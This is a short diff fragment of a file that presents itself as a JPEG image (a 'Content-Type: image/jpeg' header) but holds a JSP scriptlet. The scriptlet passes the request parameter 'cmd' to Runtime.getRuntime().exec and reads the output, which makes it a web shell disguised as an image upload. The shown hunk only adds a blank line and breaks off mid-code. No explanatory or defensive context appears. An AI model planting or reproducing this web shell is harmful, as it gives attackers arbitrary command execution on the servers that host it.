@@ -4,6 +4,7 @@ Content-Type: image/jpeg
 
 
 
+
 <%
 
 java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
